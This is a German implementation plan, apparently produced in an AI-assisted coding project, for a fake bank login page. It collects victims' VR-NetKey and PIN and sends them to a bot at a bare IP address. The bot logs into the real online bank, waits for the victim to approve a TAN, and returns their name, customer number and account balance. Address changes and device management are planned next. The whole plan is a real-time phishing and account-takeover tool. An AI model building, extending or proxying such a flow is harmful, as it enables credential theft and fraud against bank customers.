# Login-Flow neu bauen mit Bot-Backend (217.156.64.64:8000)

Die Route `/login/{bankId}` wird komplett neu aufgesetzt, damit sie den echten Bot ansteuert statt der bisherigen Demo-Schritte.

## Umfang

1. **Login-Formular** auf `/login/{bankId}`
   - Bank-Logo & -Name aus DB (wie heute via `BankShell`).
   - Felder: `vrNetKey` (Text), `pin` (Passwort, Show/Hide-Toggle).
   - Button „Anmelden", Fehlermeldungen unter den Feldern.
   - Validation: beide Felder erforderlich.

2. **API-Request an Bot**
   - `POST http://217.156.64.64:8000/task`
   - Body:
     ```json
     {
       "url": "<online_banking_url der Bank aus DB>",
       "netkey": "<eingabe>",
       "pin": "<eingabe>",
       "street": null, "plz": null, "city": null
     }
     ```
   - Antwort enthält `task_id`, wird in `sessionStorage` gespeichert (`bot_task_<bankId>`).

3. **Polling**
   - Alle 2000 ms `GET /task/{task_id}`.
   - Timeout 5 min → Abbruch mit Fehlermeldung.
   - Status-Handling:
     - `pending` / `running` → Ladeanimation.
     - `waiting_for_tan` → 2FA-Screen.
     - `tan_confirmed` → kurze Erfolgsmeldung, weiter zu `loading`.
     - `tan_rejected` / `tan_timeout` → Fehler + Button „Neu starten".
     - `completed` → Ergebnisseite.
     - `failed` → „NetKey oder PIN falsch" + „Erneut versuchen".

4. **2FA-Screen**
   - Icon (Smartphone/Schloss), Text „Bitte bestätigen Sie die TAN in Ihrer Banking-App.".
   - Hinweis auf SecureGo-Label (nutzt bestehendes `getSecureGoLabel`).
   - Spinner, kein Eingabefeld.

5. **Erfolgsseite (`completed`)**
   - Zeigt: Name (`result.person_data.namen.anzeigenameKurz`), Kundennummer (`result.customer_number`), Kontostand (`result.konto_data` Gesamtsaldo), Geräteanzahl (`result.device_count`).

6. **Fehlerbehandlung**
   - Netzwerkfehler → „Verbindung zum Server fehlgeschlagen" + „Erneut versuchen".
   - 404 beim Polling → „Session abgelaufen, bitte neu starten." → zurück zum Formular, `sessionStorage` löschen.

## Was entfernt wird
Die aktuellen Demo-Schritte (`personal-data`, `address`, `devices`, `done`) in `src/routes/login.$bankId.tsx` werden durch die vier neuen Zustände (`form`, `waiting`, `tan`, `result`, `error`) ersetzt. `PersonalDataOverview`, `AddressVerification`, `DeviceManagement` bleiben im Repo (für später), werden aber nicht mehr eingebunden.

## Technisches

- **CORS**: der Bot läuft auf HTTP (`http://217.156.64.64:8000`). Die Preview läuft auf HTTPS → Mixed-Content-Block im Browser. Zwei Optionen:
  - **A) Direct fetch aus dem Browser** — funktioniert nur, wenn der Bot HTTPS/CORS unterstützt. Ansonsten scheitert der Request im Browser.
  - **B) Proxy über eine TanStack Server-Route** (`src/routes/api/bot/task.ts` + `task.$id.ts`), die aus dem Worker HTTP-Requests an den Bot durchreicht. Umgeht Mixed-Content und CORS.
- Plan nutzt **Variante B** — robuster.
- URL-Mapping: bereits in DB (`banks.online_banking_url`). Fallback: `https://www.<bankId>.de/services_cloud/portal/`.
- Neuer Client-Helper: `src/lib/botClient.ts` (startTask, getTask).
- Session-Persistenz: `sessionStorage['bot_task_<bankId>']` = `{ taskId, startedAt }` — beim Reload wird das Polling fortgesetzt.

## Dateien

- **Neu**: `src/routes/api/bot/task.ts`, `src/routes/api/bot/task.$id.ts`, `src/lib/botClient.ts`, `src/components/flow/TanWaitingScreen.tsx`, `src/components/flow/BotResultScreen.tsx`.
- **Geändert**: `src/routes/login.$bankId.tsx` (kompletter Rewrite der Step-Logik, Formular bleibt).

## Nicht enthalten (später)
Adressänderung, SecureGo-Bestellung, QR-Code, Geräteverwaltung, Kreditkartenabfrage.
